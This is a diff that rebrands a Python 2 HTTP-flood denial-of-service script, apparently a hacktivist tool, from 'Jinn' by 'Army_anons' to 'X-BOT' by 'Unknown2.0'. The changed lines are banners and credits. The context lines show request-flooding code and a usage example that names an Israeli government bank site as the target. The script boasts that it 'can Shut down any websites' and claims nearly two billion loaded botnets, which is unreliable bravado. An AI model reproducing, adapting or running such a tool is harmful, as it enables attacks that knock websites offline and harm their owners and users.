@@ -1,11 +1,11 @@
 # ----------------------------------------------------------------------------------------------
-# Jinn - Smokeless iDDOS Tool
+# X-BOT - Smokeless iDDOS Tool
 #
-# The Jinn is one of the Most Powerful iDDOS Tool
+# The X-BOT is one of the Most Powerful iDDOS Tool
 # This tool can Shut down any websites
 # 
 #
-# author : Price V , version 3.0
+# author : unknown2x , version 1.0
 # ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
@@ -3409,24 +3409,23 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'Jinn Smokeless DDoS Tool'
-	print 'Army anons Facebook: http://wwww.facebook.com/armyanons'
-	print 'Army anons Twitter: http://wwww.twitter.com/armyanons'
-	print 'Army anons Instagram: http://wwww.instagram.com/army_anons'
+	print 'X-BOT Smokeless DDoS Tool'
+	print 'Unknown2.0 Facebook: http://wwww.facebook.com/unknown2.0'
+	print 'Unknown2.0 Twitter: http://wwww.twitter.com/unknown2.0'
+	print 'Unknown2.0 Instagram: http://wwww.instagram.com/unknown2.0'
 	print 'New loaded Botnets: 1,798,445,657'
 	print 'Usage: Jinn (url)'
 	print 'Example: Jinn.py http://israbank.gov.il/'
 	print "\a"
 print \
 """
- ooooo o88                           
-   888  oooo  oo oooooo   oo oooooo   
-   888   888   888   888   888   888  
-   888   888   888   888   888   888  
-   888  o888o o888o o888o o888o o888o 
-8o888        
-iDDOS Weapon by ----> Army_anons
-coded by -----------> Prince V
+__  __     ____   ___ _____
+\ \/ /    | __ ) / _ \_   _|
+ \  /_____|  _ \| | | || |
+ /  \_____| |_) | |_| || |
+/_/\_\    |____/ \___/ |_|
+iDDOS Weapon by ----> Unknown2.0
+coded by -----------> Unknown2x
 
 """ 
 
@@ -3453,7 +3452,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print "We made from smokeless fire Al jinn"
+			print "We made from smokeless fire of Unknown2.0"
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -3483,7 +3482,7 @@ class MonitorThread(threading.Thread):
 			if (previous+100<request_counter) & (previous<>request_counter):
 				previous=request_counter
 		if flag==2:
-			print "\n-- Sending massive packets of fear by Jinn Botnet --"
+			print "\n-- Sending massive packets of fear by X-BOT --"
 
 #exec
 if len(sys.argv) < 2:
@@ -3494,8 +3493,8 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "JINN Smokeless DDoS Tool "
-		print "Created By Army_anons"
+		print "X-BOT Smokeless DDoS Tool "
+		print "Created By Unknown2.0"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
